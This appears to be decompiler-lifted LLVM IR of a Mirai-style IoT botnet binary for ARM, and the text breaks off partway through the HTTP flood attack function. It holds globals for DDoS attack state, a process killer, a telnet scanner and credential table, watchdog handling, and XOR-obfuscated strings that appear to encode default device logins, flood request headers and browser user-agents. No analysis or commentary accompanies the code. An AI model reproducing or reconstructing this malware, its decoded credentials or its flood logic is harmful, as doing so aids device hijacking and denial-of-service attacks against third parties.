source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%timeval = type { i32, i32 }
%anon_struct_0.1 = type { [32 x i32] }
%anon_struct_0 = type { [32 x i32] }
%timeval.12 = type { i32, i32 }
%timeval_1 = type { i32, i32 }
%anon_struct_2.25 = type { [32 x i32] }
%anon_struct_2 = type { [32 x i32] }
%anon_struct_1.23 = type { [2 x i32] }
%anon_struct_1 = type { [2 x i32] }
%timeval_2 = type { i32, i32 }
%anon_struct_3 = type { [32 x i32] }
%timeval_3 = type { i32, i32 }
%anon_struct_4.39 = type { [32 x i32] }
%anon_struct_4 = type { [32 x i32] }
%anon_struct_9 = type { i32, i32*, i8, i8 }
%anon_struct_18 = type { i32, i32*, i8, i8 }
%anon_struct_18.49 = type { i32, i32*, i8, i8 }
%anon_struct_3.33 = type { [32 x i32] }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2c00c.23 = global i32 0
@global_var_22dc8.29 = constant [4 x i8] c"GET\00"
@global_var_22dd4.37 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_22dec.39 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_22df8.41 = constant [3 x i8] c"\0D\0A\00"
@global_var_22dfc.43 = constant [9 x i8] c"Cookie: \00"
@global_var_22e08.45 = constant [3 x i8] c"; \00"
@global_var_22e0c.47 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_22e18.53 = constant [5 x i8] c"http\00"
@global_var_22e20.55 = constant [5 x i8] c"url=\00"
@global_var_22e28.58 = constant [5 x i8] c"POST\00"
@global_var_22e38.66 = constant [15 x i8] c"POST /cdn-cgi/\00"
@global_var_22e48.72 = constant [4 x i8] c"0\0D\0A\00"
@global_var_10e30.74 = constant i32 -509558771
@global_var_114ac.76 = constant i32 -509558771
@global_var_11ac0.78 = constant i32 -509558771
@global_var_122a8.80 = constant i32 -509558771
@global_var_eed0.82 = constant i32 -509558771
@global_var_f8f8.84 = constant i32 -509558771
@global_var_10290.86 = constant i32 -509558771
@global_var_e504.89 = constant i32 -509558771
@attack_ongoing = global [8 x i32] zeroinitializer
@methods = local_unnamed_addr global i32 0
@global_var_d8d0.93 = constant i32 -369098744
@methods_len = global i8 0
@LOCAL_ADDR = global i32 0
@killer_pid = local_unnamed_addr global i32 0
@killer_realpath.109 = local_unnamed_addr global i32 0
@killer_realpath_len = global i32 0
@global_var_22e4c.114 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_14d04.119 = constant i32 -509558771
@global_var_22e60.121 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_22e70.123 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_22e84.125 = constant i32 47
@srv_addr = global i32 0
@global_var_2ed84.129 = local_unnamed_addr global i32 0
@global_var_2ed82.130 = local_unnamed_addr global i32 0
@global_var_22e88.133 = constant i32 10
@fd_ctrl = local_unnamed_addr global i32 -1
@fd_serv = global i32 -1
@pending_connection = local_unnamed_addr global i8 0
@global_var_22e8c.140 = constant i32 16777216
@resolve_func = global void ()* inttoptr (i32 105756 to void ()*)
@global_var_14d38.143 = constant i32 -509558771
@global_var_22eb8.156 = constant [3 x i8] c"/.\00"
@global_var_19038.166 = constant i32 -509558771
@global_var_22eb4.170 = constant i32 85252
@x = global i32 0
@y = global i32 0
@z = local_unnamed_addr global i32 0
@w = global i32 0
@global_var_22ecc.181 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@scanner_pid = local_unnamed_addr global i32 0
@fake_time = global i32 0
@conn_table = local_unnamed_addr global i32 0
@authindex_table = global [256 x i32] zeroinitializer
@rsck = local_unnamed_addr global i32 0
@scanner_rawpkt = global [40 x i8] zeroinitializer
@global_var_2c290.190 = global i32 0
@global_var_2c27e.191 = local_unnamed_addr global i32 0
@global_var_2c280.192 = local_unnamed_addr global i32 0
@global_var_2c284.193 = local_unnamed_addr global i32 0
@global_var_2c285.194 = local_unnamed_addr global i32 0
@global_var_2c29e.197 = local_unnamed_addr global i32 0
@global_var_22ef0.200 = constant [5 x i8] c"PMMV\00"
@global_var_22ef8.202 = constant [6 x i8] c"CFOKL\00"
@global_var_22f00.204 = constant [6 x i8] c"TKXZT\00"
@global_var_22f18.210 = constant [8 x i8] c"FGDCWNV\00"
@global_var_22f20.212 = constant [7 x i8] c"CLVQNS\00"
@global_var_22f28.214 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_22f38.218 = constant [8 x i8] c"QWRRMPV\00"
@global_var_22f54.224 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_22f68.228 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_22f8c.236 = constant [5 x i8] c"WQGP\00"
@global_var_22f94.238 = constant [6 x i8] c"EWGQV\00"
@global_var_22f9c.240 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_22fd4.252 = constant [11 x i8] c"GRKAPMWVGP\00"
@global_var_22fec.256 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_2301c.264 = constant [5 x i8] c"TLRV\00"
@global_var_23038.270 = constant [7 x i8] c"OGPNKL\00"
@global_var_23040.272 = constant [7 x i8] c"LM@MF[\00"
@global_var_2305c.278 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_2c288.281 = local_unnamed_addr global i32 0
@global_var_2c28c.282 = local_unnamed_addr global i32 0
@global_var_2c286.283 = local_unnamed_addr global i32 0
@global_var_2c294.284 = local_unnamed_addr global i32 0
@global_var_2c2a0.285 = local_unnamed_addr global i32 0
@auth_table_len = local_unnamed_addr global i32 0
@global_var_23074.289 = constant [3 x i8] c"\0D\0A\00"
@global_var_23080.293 = constant i32 2096127
@global_var_23077.295 = constant i32 2095871
@global_var_23084.297 = constant [5 x i8] c"ogin\00"
@global_var_2308c.299 = constant [6 x i8] c"enter\00"
@global_var_23094.301 = constant [8 x i8] c"assword\00"
@auth_table = local_unnamed_addr global i32 0
@auth_table_max_weight = global i16 0
@global_var_2309c.312 = constant [3 x i8] c"\225\00"
@global_var_230d4.320 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_230dc.322 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_230f0.326 = constant [5 x i8] c"\0DDF\22\00"
@global_var_230f8.328 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_23100.330 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_2311c.334 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_23128.336 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_23158.340 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_23164.342 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_23170.344 = constant [7 x i8] c"QJGNN\22\00"
@global_var_23178.346 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_23180.348 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_23188.350 = constant [4 x i8] c"QJ\22\00"
@global_var_231bc.356 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_2320c.364 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_23354.388 = constant [9 x i8] c"AJWLIGF\22\00"
@table = global i32 0
@table_key = local_unnamed_addr global i32 -559038737
@global_var_2c010.418 = global i32 0
@global_var_1a8e8.441 = constant i32 -443088884
@global_var_1ad7c.457 = constant i32 -456978431
@global_var_10fd4.473 = constant [3 x i8] c"\08)\00"
@global_var_1b6a8.502 = constant i32 -478871519
@global_var_1c14c.519 = constant i32 -478805983
@global_var_1c534.529 = constant i32 -382906384
@global_var_1e830.538 = constant i32 -442544040
@global_var_1cecc.561 = constant i32 -369098502
@global_var_1d8a0.575 = constant i32 -382910288
@global_var_1dc3c.593 = constant i32 -2020859901
@global_var_1dd28.596 = constant i32 -494075872
@global_var_1a754.597 = constant i32 -382910336
@global_var_2f6c8.600 = local_unnamed_addr global i32 0
@global_var_1c964.613 = constant i32 -442543860
@global_var_1ace0.621 = constant i32 -369093006
@global_var_1ed28.647 = constant i32 -382910352
@global_var_1c6e8.667 = constant i32 -382909968
@global_var_20138.671 = constant i32 -382906384
@global_var_1fbf8.700 = constant i32 -382910448
@global_var_215e8.701 = constant i32 -382909968
@global_var_a930.756 = constant i32 436207713
@global_var_21d24.765 = constant i32 -481296376
@global_var_21e1c.766 = constant i32 -481296376
@global_var_21ea0.767 = constant i32 -369098732
@global_var_2c21c.13 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@2 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@3 = internal constant [2 x i8] c" \00"
@4 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@5 = internal constant [2 x i8] c";\00"
@6 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0)
@7 = internal constant [2 x i8] c"'\00"
@8 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @7, i32 0, i32 0)
@9 = internal constant [2 x i8] c"=\00"
@10 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @9, i32 0, i32 0)
@11 = internal constant [2 x i8] c"/\00"
@12 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @11, i32 0, i32 0)
@13 = internal constant [2 x i8] c"\01\00"
@global_var_2c0cc.153 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @13, i32 0, i32 0)
@global_var_2c292.195 = local_unnamed_addr global i16 0
@global_var_2c29c.196 = local_unnamed_addr global i8 0
@global_var_2c29d.198 = local_unnamed_addr global i8 0
@14 = internal constant [7 x i8] c"eo\1A\13\1A\10\00"
@global_var_22f08.206 = constant i8* getelementptr inbounds ([7 x i8], [7 x i8]* @14, i32 0, i32 0)
@15 = internal constant [7 x i8] c"ZA\11\17\13\13\00"
@global_var_22f10.208 = constant i8* getelementptr inbounds ([7 x i8], [7 x i8]* @15, i32 0, i32 0)
@16 = internal constant [5 x i8] c"\13\10\11\16\00"
@global_var_22f30.216 = constant i8* getelementptr inbounds ([5 x i8], [5 x i8]* @16, i32 0, i32 0)
@17 = internal constant [6 x i8] c"\13\10\11\16\17\00"
@global_var_22f40.220 = constant i8* getelementptr inbounds ([6 x i8], [6 x i8]* @17, i32 0, i32 0)
@18 = internal constant [9 x i8] c"\13\12\12\13AJKL\00"
@global_var_22f48.222 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @18, i32 0, i32 0)
@19 = internal constant [6 x i8] c"\17\16\11\10\13\00"
@global_var_22f60.226 = constant i8* getelementptr inbounds ([6 x i8], [6 x i8]* @19, i32 0, i32 0)
@20 = internal constant [7 x i8] c"\13\10\11\16\17\14\00"
@global_var_22f74.230 = constant i8* getelementptr inbounds ([7 x i8], [7 x i8]* @20, i32 0, i32 0)
@21 = internal constant [5 x i8] c"\13\13\13\13\00"
@global_var_22f7c.232 = constant i8* getelementptr inbounds ([5 x i8], [5 x i8]* @21, i32 0, i32 0)
@22 = internal constant [7 x i8] c"xVG\17\10\13\00"
@global_var_22f84.234 = constant i8* getelementptr inbounds ([7 x i8], [7 x i8]* @22, i32 0, i32 0)
@23 = internal constant [9 x i8] c"JWLV\17\15\17\1B\00"
@global_var_22fa4.242 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @23, i32 0, i32 0)
@24 = internal constant [4 x i8] c"\17WR\00"
@global_var_22fb0.244 = constant i8* getelementptr inbounds ([4 x i8], [4 x i8]* @24, i32 0, i32 0)
@25 = internal constant [7 x i8] c"CFOKL\13\00"
@global_var_22fb4.246 = constant i8* getelementptr inbounds ([7 x i8], [7 x i8]* @25, i32 0, i32 0)
@global_var_22fbc.248 = external constant i8*
@26 = internal constant [17 x i8] c"TGPVGZ\10\17GIVIQ\13\10\11\00"
@global_var_22fc0.250 = constant i8* getelementptr inbounds ([17 x i8], [17 x i8]* @26, i32 0, i32 0)
@27 = internal constant [9 x i8] c"CFOKL\13\10\11\00"
@global_var_22fe0.254 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @27, i32 0, i32 0)
@28 = internal constant [9 x i8] c"X[CF\13\10\11\16\00"
@global_var_22ff8.258 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @28, i32 0, i32 0)
@29 = internal constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00"
@global_var_23004.260 = constant i8* getelementptr inbounds ([11 x i8], [11 x i8]* @29, i32 0, i32 0)
@30 = internal constant [9 x i8] c"UKL\13FMUQ\00"
@global_var_23010.262 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @30, i32 0, i32 0)
@31 = internal constant [9 x i8] c"uKL\13FMu\06\00"
@global_var_23024.266 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @31, i32 0, i32 0)
@32 = internal constant [7 x i8] c"OE\11\17\12\12\00"
@global_var_23030.268 = constant i8* getelementptr inbounds ([7 x i8], [7 x i8]* @32, i32 0, i32 0)
@33 = internal constant [5 x i8] c"\12\12\12\12\00"
@global_var_23048.274 = constant i8* getelementptr inbounds ([5 x i8], [5 x i8]* @33, i32 0, i32 0)
@34 = internal constant [9 x i8] c"\13\13\13\13\13\13\13\13\00"
@global_var_23050.276 = constant i8* getelementptr inbounds ([9 x i8], [9 x i8]* @34, i32 0, i32 0)
@35 = internal constant [10 x i8] c"DMWLFGP\1A\1A\00"
@global_var_23068.280 = constant i8* getelementptr inbounds ([10 x i8], [10 x i8]* @35, i32 0, i32 0)
@36 = internal constant [3 x i8] c"\99\C7\00"
@global_var_230a0.314 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @36, i32 0, i32 0)
@37 = internal constant [16 x i8] c"NKQVGLKLE\02VWL\12\22\00"
@global_var_230a4.316 = constant i8* getelementptr inbounds ([16 x i8], [16 x i8]* @37, i32 0, i32 0)
@38 = internal constant [30 x i8] c"JVVRQ\18\0D\0D[MWVW\0C@G\0DFsU\16U\1BuEzAs\22\00"
@global_var_230b4.318 = constant i8* getelementptr inbounds ([30 x i8], [30 x i8]* @38, i32 0, i32 0)
@39 = internal constant [12 x i8] c"\02\0AFGNGVGF\0B\22\00"
@global_var_230e4.324 = constant i8* getelementptr inbounds ([12 x i8], [12 x i8]* @39, i32 0, i32 0)
@40 = internal constant [14 x i8] c"pgrmpv\02\07Q\18\07Q\22\00"
@global_var_2310c.332 = constant i8* getelementptr inbounds ([14 x i8], [14 x i8]* @40, i32 0, i32 0)
@41 = internal constant [34 x i8] c"~Z\17\1A~Z\16f~Z\16g~Z\16g~Z\16\11~Z\17\12~Z\16\14~Z\10\10\22\00"
@global_var_23134.338 = constant i8* getelementptr inbounds ([34 x i8], [34 x i8]* @41, i32 0, i32 0)
@42 = internal constant [20 x i8] c"\0D@KL\0D@WQ[@MZ\02okpck\22\00"
@global_var_2318c.352 = constant i8* getelementptr inbounds ([20 x i8], [20 x i8]* @42, i32 0, i32 0)
@43 = internal constant [25 x i8] c"okpck\18\02CRRNGV\02LMV\02DMWLF\22\00"
@global_var_231a0.354 = constant i8* getelementptr inbounds ([25 x i8], [25 x i8]* @43, i32 0, i32 0)
@44 = internal constant [17 x i8] c"\0D@KL\0D@WQ[@MZ\02RQ\22\00"
@global_var_231c8.358 = constant i8* getelementptr inbounds ([17 x i8], [17 x i8]* @44, i32 0, i32 0)
@45 = internal constant [23 x i8] c"\0D@KL\0D@WQ[@MZ\02IKNN\02\0F\1B\02\22\00"
@global_var_231dc.360 = constant i8* getelementptr inbounds ([23 x i8], [23 x i8]* @45, i32 0, i32 0)
@46 = internal constant [22 x i8] c"vqMWPAG\02gLEKLG\02sWGP[\22\00"
@global_var_231f4.362 = constant i8* getelementptr inbounds ([22 x i8], [22 x i8]* @46, i32 0, i32 0)
@47 = internal constant [13 x i8] c"LCOGQGPTGP\02\22\00"
@global_var_23220.366 = constant i8* getelementptr inbounds ([13 x i8], [13 x i8]* @47, i32 0, i32 0)
@48 = internal constant [24 x i8] c"aMLLGAVKML\18\02IGGR\0FCNKTG\22\00"
@global_var_23230.368 = constant i8* getelementptr inbounds ([24 x i8], [24 x i8]* @48, i32 0, i32 0)
@49 = internal constant [84 x i8] c"cAAGRV\18\02VGZV\0DJVON\0ECRRNKACVKML\0DZJVON\09ZON\0ECRRNKACVKML\0DZON\19S\1F\12\0C\1B\0EKOCEG\0DUG@R\0E\08\0D\08\19S\1F\12\0C\1A\22\00"
@global_var_23248.370 = constant i8* getelementptr inbounds ([84 x i8], [84 x i8]* @49, i32 0, i32 0)
@50 = internal constant [33 x i8] c"cAAGRV\0FnCLEWCEG\18\02GL\0Fwq\0EGL\19S\1F\12\0C\1A\22\00"
@global_var_2329c.372 = constant i8* getelementptr inbounds ([33 x i8], [33 x i8]* @50, i32 0, i32 0)
@51 = internal constant [49 x i8] c"aMLVGLV\0Fv[RG\18\02CRRNKACVKML\0DZ\0FUUU\0FDMPO\0FWPNGLAMFGF\22\00"
@global_var_232c0.374 = constant i8* getelementptr inbounds ([49 x i8], [49 x i8]* @51, i32 0, i32 0)
@52 = internal constant [13 x i8] c"QGVaMMIKG\0A\05\22\00"
@global_var_232f4.376 = constant i8* getelementptr inbounds ([13 x i8], [13 x i8]* @52, i32 0, i32 0)
@53 = internal constant [10 x i8] c"PGDPGQJ\18\22\00"
@global_var_23304.378 = constant i8* getelementptr inbounds ([10 x i8], [10 x i8]* @53, i32 0, i32 0)
@54 = internal constant [11 x i8] c"NMACVKML\18\22\00"
@global_var_23310.380 = constant i8* getelementptr inbounds ([11 x i8], [11 x i8]* @54, i32 0, i32 0)
@55 = internal constant [13 x i8] c"QGV\0FAMMIKG\18\22\00"
@global_var_2331c.382 = constant i8* getelementptr inbounds ([13 x i8], [13 x i8]* @55, i32 0, i32 0)
@56 = internal constant [17 x i8] c"AMLVGLV\0FNGLEVJ\18\22\00"
@global_var_2332c.384 = constant i8* getelementptr inbounds ([17 x i8], [17 x i8]* @56, i32 0, i32 0)
@57 = internal constant [20 x i8] c"VPCLQDGP\0FGLAMFKLE\18\22\00"
@global_var_23340.386 = constant i8* getelementptr inbounds ([20 x i8], [20 x i8]* @57, i32 0, i32 0)
@58 = internal constant [12 x i8] c"IGGR\0FCNKTG\22\00"
@global_var_23360.390 = constant i8* getelementptr inbounds ([12 x i8], [12 x i8]* @58, i32 0, i32 0)
@59 = internal constant [13 x i8] c"AMLLGAVKML\18\22\00"
@global_var_2336c.392 = constant i8* getelementptr inbounds ([13 x i8], [13 x i8]* @59, i32 0, i32 0)
@60 = internal constant [19 x i8] c"QGPTGP\18\02FMQCPPGQV\22\00"
@global_var_2337c.394 = constant i8* getelementptr inbounds ([19 x i8], [19 x i8]* @60, i32 0, i32 0)
@61 = internal constant [26 x i8] c"QGPTGP\18\02ANMWFDNCPG\0FLEKLZ\22\00"
@global_var_23390.396 = constant i8* getelementptr inbounds ([26 x i8], [26 x i8]* @61, i32 0, i32 0)
@62 = internal constant [112 x i8] c"oMXKNNC\0D\17\0C\12\02\0AuKLFMUQ\02lv\02\13\12\0C\12\19\02umu\14\16\0B\02cRRNGuG@iKV\0D\17\11\15\0C\11\14\02\0Aijvon\0E\02NKIG\02eGAIM\0B\02aJPMOG\0D\17\13\0C\12\0C\10\15\12\16\0C\13\12\11\02qCDCPK\0D\17\11\15\0C\11\14\22\00"
@global_var_233ac.398 = constant i8* getelementptr inbounds ([112 x i8], [112 x i8]* @62, i32 0, i32 0)
@63 = internal constant [112 x i8] c"oMXKNNC\0D\17\0C\12\02\0AuKLFMUQ\02lv\02\13\12\0C\12\19\02umu\14\16\0B\02cRRNGuG@iKV\0D\17\11\15\0C\11\14\02\0Aijvon\0E\02NKIG\02eGAIM\0B\02aJPMOG\0D\17\10\0C\12\0C\10\15\16\11\0C\13\13\14\02qCDCPK\0D\17\11\15\0C\11\14\22\00"
@global_var_2341c.400 = constant i8* getelementptr inbounds ([112 x i8], [112 x i8]* @63, i32 0, i32 0)
@64 = internal constant [111 x i8] c"oMXKNNC\0D\17\0C\12\02\0AuKLFMUQ\02lv\02\14\0C\13\19\02umu\14\16\0B\02cRRNGuG@iKV\0D\17\11\15\0C\11\14\02\0Aijvon\0E\02NKIG\02eGAIM\0B\02aJPMOG\0D\17\13\0C\12\0C\10\15\12\16\0C\13\12\11\02qCDCPK\0D\17\11\15\0C\11\14\22\00"
@global_var_2348c.402 = constant i8* getelementptr inbounds ([111 x i8], [111 x i8]* @64, i32 0, i32 0)
@65 = internal constant [111 x i8] c"oMXKNNC\0D\17\0C\12\02\0AuKLFMUQ\02lv\02\14\0C\13\19\02umu\14\16\0B\02cRRNGuG@iKV\0D\17\11\15\0C\11\14\02\0Aijvon\0E\02NKIG\02eGAIM\0B\02aJPMOG\0D\17\10\0C\12\0C\10\15\16\11\0C\13\13\14\02qCDCPK\0D\17\11\15\0C\11\14\22\00"
@global_var_234fc.404 = constant i8* getelementptr inbounds ([111 x i8], [111 x i8]* @65, i32 0, i32 0)
@66 = internal constant [118 x i8] c"oMXKNNC\0D\17\0C\12\02\0AoCAKLVMQJ\19\02kLVGN\02oCA\02mq\02z\02\13\12}\13\13}\14\0B\02cRRNGuG@iKV\0D\14\12\13\0C\15\0C\15\02\0Aijvon\0E\02NKIG\02eGAIM\0B\02tGPQKML\0D\1B\0C\13\0C\10\02qCDCPK\0D\14\12\13\0C\15\0C\15\22\00"
@global_var_2356c.406 = constant i8* getelementptr inbounds ([118 x i8], [118 x i8]* @66, i32 0, i32 0)
@global_var_2c068.414 = local_unnamed_addr global i16 8
@global_var_22dcc.31 = constant [2 x i8] c"/\00"
@global_var_22dd0.35 = constant [2 x i8] c" \00"
@global_var_22e14.51 = constant [2 x i8] c";\00"
@global_var_22e30.60 = constant [2 x i8] c"'\00"
@global_var_22e34.62 = constant [2 x i8] c"=\00"
@global_var_22e5c.116 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_8108 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_8108)
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_810c = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_810c)
  %v1_810c = load i32, i32* @r0, align 4
  ret i32 %v1_810c
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_8110 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_8110)
  %v1_8110 = load i32, i32* @r0, align 4
  ret i32 %v1_8110
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_8114 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_8114)
  %v1_8114 = load i32, i32* @r0, align 4
  ret i32 %v1_8114
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_8118 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_8118)
  %v1_8118 = load i32, i32* @r0, align 4
  ret i32 %v1_8118
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_811c = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_811c)
  %v1_811c = load i32, i32* @r0, align 4
  ret i32 %v1_811c
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8120 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8120)
  %v1_8120 = load i32, i32* @r0, align 4
  ret i32 %v1_8120
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8124 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8124)
  %v1_8124 = load i32, i32* @r0, align 4
  ret i32 %v1_8124
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8128 = load i32, i32* @r0, align 4
  ret i32 %v1_8128
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_812c = load i32, i32* @r4, align 4
  store i32 %v3_812c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2c21c.13 to i32), i32* %r4.global-to-local, align 4
  %v2_8134 = load i8, i8* bitcast (i8** @global_var_2c21c.13 to i8*), align 4
  %v2_8138 = icmp eq i8 %v2_8134, 0
  br i1 %v2_8138, label %dec_label_pc_8140, label %dec_label_pc_815c

dec_label_pc_8140:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* %r4.global-to-local, align 4
  %v3_8158 = inttoptr i32 %v2_8158 to i8*
  store i8 1, i8* %v3_8158, align 1
  %v2_815c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_815c

dec_label_pc_815c:                                ; preds = %entry, %dec_label_pc_8140
  %v2_815c = phi i32 [ %v3_812c, %entry ], [ %v2_815c.pre, %dec_label_pc_8140 ]
  store i32 %v2_815c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2c21c.13, { 1, 0 }
  uselistorder label %dec_label_pc_815c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8194 = load i32, i32* @global_var_2c00c.23, align 4
  %v2_8198 = icmp eq i32 %v2_8194, 0
  br i1 %v2_8198, label %dec_label_pc_81b0, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_81b0

dec_label_pc_81b0:                                ; preds = %bb, %dec_label_pc_81a0
  ret i32 ptrtoint (i32* @global_var_2c00c.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2c00c.23, { 1, 0 }
  uselistorder label %dec_label_pc_81b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81d8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81f8 = call i32 @__uClibc_main(i32 82296, i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 142776, i32 %arg1, i32 %v4_81d8)
  %v0_81fc = call i32 @abort()
  ret i32 %v0_81fc
}

define void @attack_app_proxy(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  ret void
}

define void @attack_app_http(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp76 = sext i8 %targs_len to i32
  %err_len_-10492 = alloca i32, align 4
  %err_-10488 = alloca i32, align 4
  %tim_-10468 = alloca %timeval, align 8
  %buf_-20988 = alloca [10240 x i8], align 1
  %i_-216 = alloca i32, align 4
  %addr_-10484 = alloca i32, align 4
  %fdset_wr_-10748 = alloca %anon_struct_0.1, align 8
  %fdset_rd_-10620 = alloca %anon_struct_0, align 8
  %wait_time_-10457 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8244 = load i32, i32* @r4, align 4
  store i32 33356, i32* %stack_var_-4, align 4
  %v2_8248 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8248, i32* @fp, align 4
  %v2_8260 = ptrtoint i32* %stack_var_-32 to i32
  %v14_82e0 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 21, i8* null)
